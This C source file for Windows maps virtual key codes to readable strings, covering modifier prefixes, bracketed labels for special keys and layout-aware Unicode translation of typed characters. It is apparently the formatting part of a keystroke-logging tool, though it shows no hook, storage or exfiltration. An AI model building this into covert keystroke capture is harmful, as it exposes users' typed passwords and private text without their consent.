#include "winkey.h"

// Static buffer for building key strings
static char keyStringBuffer[32];

// Macro to detect modifier keys
#define IS_MOD_KEY(vk) ( \
    (vk)==VK_LSHIFT || (vk)==VK_RSHIFT || (vk)==VK_SHIFT || \
    (vk)==VK_LCONTROL || (vk)==VK_RCONTROL || (vk)==VK_CONTROL || \
    (vk)==VK_LMENU || (vk)==VK_RMENU || (vk)==VK_MENU || \
    (vk)==VK_LWIN || (vk)==VK_RWIN )

// Gets the prefix of active modifiers (without exceeding buffer)
static void GetActiveModifiers(char* dst, size_t cap)
{
    dst[0] = '\0';
    if (GetAsyncKeyState(VK_RCONTROL) & 0x8000) strcat_s(dst, cap, "[RCTRL]");
    if (GetAsyncKeyState(VK_LSHIFT) & 0x8000)   strcat_s(dst, cap, "[LSHIFT]");
    if (GetAsyncKeyState(VK_RSHIFT) & 0x8000)   strcat_s(dst, cap, "[RSHIFT]");
	if (GetAsyncKeyState(VK_LMENU) & 0x8000)    strcat_s(dst, cap, "[LALT]");
    if ((GetAsyncKeyState(VK_LCONTROL) & 0x8000) && (GetAsyncKeyState(VK_RMENU) & 0x8000))
		strcat_s(dst, cap, "[ALTGR]");
	else {
    	if (GetAsyncKeyState(VK_LCONTROL) & 0x8000) strcat_s(dst, cap, "[LCTRL]");
		if (GetAsyncKeyState(VK_RMENU) & 0x8000)    strcat_s(dst, cap, "[RALT]");
	}
}

// Maps special keys to readable labels
static const char* SpecialKeyToString(DWORD vk)
{
    switch (vk) {
        case VK_RETURN:              return "\n";
        case VK_BACK:                return "[BACKSPACE]";
        case VK_TAB:                 return "[TAB]";
        case VK_ESCAPE:              return "[ESC]";
        case VK_CAPITAL:             return "[CAPS]";
        case VK_INSERT:              return "[INSERT]";
        case VK_DELETE:              return "[DELETE]";
        case VK_HOME:                return "[HOME]";
        case VK_END:                 return "[END]";
        case VK_PRIOR:               return "[PAGE UP]";
        case VK_NEXT:                return "[PAGE DOWN]";
        case VK_LEFT:                return "[LEFT]";
        case VK_RIGHT:               return "[RIGHT]";
        case VK_UP:                  return "[UP]";
        case VK_DOWN:                return "[DOWN]";
        case VK_F1:                  return "[F1]";
        case VK_F2:                  return "[F2]";
        case VK_F3:                  return "[F3]";
        case VK_F4:                  return "[F4]";
        case VK_F5:                  return "[F5]";
        case VK_F6:                  return "[F6]";
        case VK_F7:                  return "[F7]";
        case VK_F8:                  return "[F8]";
        case VK_F9:                  return "[F9]";
        case VK_F10:                 return "[F10]";
        case VK_F11:                 return "[F11]";
        case VK_F12:                 return "[F12]";
        case VK_VOLUME_MUTE:         return "[VOLUME MUTE]";
        case VK_VOLUME_DOWN:         return "[VOLUME DOWN]";
        case VK_VOLUME_UP:           return "[VOLUME UP]";
        case VK_MEDIA_NEXT_TRACK:    return "[MEDIA NEXT]";
        case VK_MEDIA_PREV_TRACK:    return "[MEDIA PREV]";
        case VK_MEDIA_STOP:          return "[MEDIA STOP]";
        case VK_MEDIA_PLAY_PAUSE:    return "[MEDIA PLAY/PAUSE]";
        case VK_LAUNCH_MAIL:         return "[MAIL]";
        case VK_LAUNCH_MEDIA_SELECT: return "[MEDIA SELECT]";
        case VK_LAUNCH_APP1:         return "[APP1]";
        case VK_LAUNCH_APP2:         return "[APP2]";
        default:                     return NULL;
    }
}

// Uses ToUnicodeEx to translate VK to UTF-8 according to active layout
static const char* ToUnicodeVkToUtf8(DWORD vk, char* out, size_t outCap)
{
    BYTE ks[256]; BuildKeyboardState(ks);
    HKL lay = GetKeyboardLayout(0);
    UINT sc = MapVirtualKeyEx((UINT)vk, MAPVK_VK_TO_VSC, lay);
    WCHAR wbuf[8] = {0};
    int r = ToUnicodeEx(vk, sc, ks, wbuf, 8, 0, lay);
    if (r < 0) // Dead key capture
    { 
        WCHAR dummy[8]; 
        ToUnicodeEx(vk, sc, ks, dummy, 8, 0, lay); 
        out[0] = '\0'; 
        return out; 
    }
    if (r >= 1) 
    {
        int n = WideCharToMultiByte(CP_UTF8, 0, wbuf, r, out, (int)outCap-1, NULL, NULL);
        if (n > 0) 
        { 
            unsigned char c0 = (unsigned char)out[0]; 
            if (c0 >= 0x20 && c0 != 0x7F)
            { // hex for ' ' (space) and DEL
                out[n] = '\0';
                return out;
            } 
        }
    }
    out[0] = '\0';
    return out;
}

// Converts virtual key code to readable string (UTF-8)
const char* VkCodeToString(DWORD vk)
{
    if (IS_MOD_KEY(vk)) 
        return "";
    char mods[32]; GetActiveModifiers(mods, sizeof(mods));

    // Avoid control chars in Ctrl+letter
    if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && vk >= 'A' && vk <= 'Z') {
        if (mods[0]) 
            sprintf_s(keyStringBuffer, sizeof(keyStringBuffer), "%s%c", mods, (char)vk);
        else { 
            keyStringBuffer[0] = (char)vk; 
            keyStringBuffer[1] = '\0'; 
        }
        return keyStringBuffer;
    }

    const char* sp = SpecialKeyToString(vk);
    if (sp) { 
        if (mods[0]) { 
            sprintf_s(keyStringBuffer, sizeof(keyStringBuffer), "%s%s", mods, sp); 
            return keyStringBuffer; 
        } 
        return sp; 
    }

    char base[32]; ToUnicodeVkToUtf8(vk, base, sizeof(base));
    if (!base[0]) 
        return "";
    if (mods[0]) { 
        sprintf_s(keyStringBuffer, sizeof(keyStringBuffer), "%s%s", mods, base); 
        return keyStringBuffer; 
    }
    strcpy_s(keyStringBuffer, sizeof(keyStringBuffer), base);
    return keyStringBuffer;
}